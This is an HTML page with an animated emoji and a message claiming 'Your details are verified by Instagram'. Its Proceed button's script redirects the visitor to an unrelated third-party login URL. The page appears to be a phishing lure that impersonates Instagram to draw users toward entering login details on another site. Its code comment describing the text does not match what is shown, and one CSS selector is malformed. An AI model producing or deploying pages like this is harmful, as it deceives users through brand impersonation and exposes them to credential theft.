<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <style>
      /* Set the background color to black */
      body {
        background-color: black;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
      }
      
      /* Style the emoji */
      .emoji {
        animation: dance 1s ease-in-out infinite;
        display: flex;
        align-items: center;
        font-size: 128px;
        color: cornflowerblue;
      }

      /* Add hands to the emoji */
      .left-hand {
        content: "👋";
        font-size: 50px;
        margin-right: 0px;
      }
      .right-hand {
        content: "👋";
        font-size: 50px;
        margin-left: 0px;
      }
      .left-foot {
        content: "👣";
        font-size: 32px;
        margin-right: 16px;
        color: cornflowerblue;
      }
      .right-foot {
        content: "👣";
        font-size: 32px;
        margin-left: 16px;
        color: cornflowerblue;
      }

      /* Define the animation for the emoji */
      @keyframes dance {
        0% { transform: translateY(0); }
        50% { transform: translateY(-30px); }
        100% { transform: translateY(0); }
      }

      /* Style the text */
      .text {
        animation: text-fall 1s ease-in-out;
        color: lightgreen;
        margin-top: 16px;
        font-size: 27px;
      }

      /* Define the animation for the text */
      @keyframes text-fall {
        0% { transform: translateY(-100%); }
        100% { transform: translateY(0); }
      }
      button {
        background-color: lightblue;
        color: red;
        padding: 10px 25px;
        border-radius: 25px;
        cursor: pointer;
        font-size: 20px;
        margin-bottom: 20px;
        font-family: "Georgia",Georgia;
      }
      button =redirect-button2 {
        margin-top: 20px;
      }
    </style>
  </head>
  <body>
    <!-- Display the dancing smiley emoji -->
    <div class="emoji">
      <span class="left-hand">👋</span>
      😃
      <span class="right-hand">👋</span>
       </div>
    <div class="emoji" >
      <span class="left-foot">👣</span>
      <span class="right-foot">👣</span>
    </div>

    <!-- Display the text "Thank you for visiting our page" -->
    <p class="text"><u><i>"Your details are verified by Instagram. Click Proceed to continue"</i></u></p>
    <button id="redirect-button"><u><b>Proceed</b></u> </button>

    <!-- Add JavaScript to redirect the user when the button is clicked -->
    <script>
      // Get the button by its id
      var button = document.getElementById("redirect-button");

      // Add a click event listener to the button
      button.addEventListener("click", function() {
        // Redirect the user to the specified URL
        window.location = "http://unilead.msell.in/login";
      });
    </script>

  </body>
</html>
